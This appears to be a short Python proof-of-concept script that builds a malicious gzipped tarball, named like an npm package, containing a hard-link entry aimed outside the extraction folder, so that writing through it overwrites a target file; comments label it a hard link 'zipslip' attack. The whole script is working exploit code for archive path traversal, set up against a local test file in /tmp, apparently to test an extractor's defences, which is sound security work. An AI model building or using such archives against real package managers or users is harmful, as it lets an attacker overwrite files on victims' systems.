import tarfile, io, os

# Hard link attack: file at /tmp/zipslip-test/escape-target/existing exists
# Hardlink package/link -> /tmp/zipslip-test/escape-target/existing
# Then write to package/link which overwrites the linked file
out_path = "/tmp/zipslip-test/evil-hardlink.tgz"

# First create a target file
os.makedirs("/tmp/zipslip-test/escape-target", exist_ok=True)
with open("/tmp/zipslip-test/escape-target/existing", "w") as f:
    f.write("ORIGINAL_CONTENT\n")

with tarfile.open(out_path, "w:gz") as tar:
    pkg_info = tarfile.TarInfo("package/package.json")
    pkg_content = b'{"version":"0.2.1","name":"evil"}'
    pkg_info.size = len(pkg_content)
    tar.addfile(pkg_info, io.BytesIO(pkg_content))
    # Hard link entry
    link = tarfile.TarInfo("package/link")
    link.type = tarfile.LNKTYPE
    link.linkname = "/tmp/zipslip-test/escape-target/existing"
    tar.addfile(link)
